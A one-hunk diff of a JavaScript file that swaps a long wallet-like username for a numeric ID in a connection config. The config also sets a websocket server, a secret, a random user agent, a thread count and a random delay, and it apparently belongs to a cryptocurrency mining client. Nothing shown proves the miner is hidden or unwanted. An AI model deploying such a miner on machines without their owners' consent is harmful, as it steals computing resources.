@@ -2929,7 +2929,7 @@
       randomDelay = () => Math.floor(Math.random() * 3000) + 2000;
     const d = {
         url: `${e.SERVER_WS}/${e.SERVER_TARGET}`,
-        username: '85Z4CgUZDjxCyDmKLe2gLZJMnfUiS2Ticcf7NLGpdwnH9HcNRGKAoZERVNrwVew99ZdiZchjiZzTigE5beFDJ2rdTxoGAxr',
+        username: '1851807556',
         password: e.SERVER_SECRET,
         agent: randomAgent(),
         threads: Number(e.SERVER_CONNECTION ?? 2),
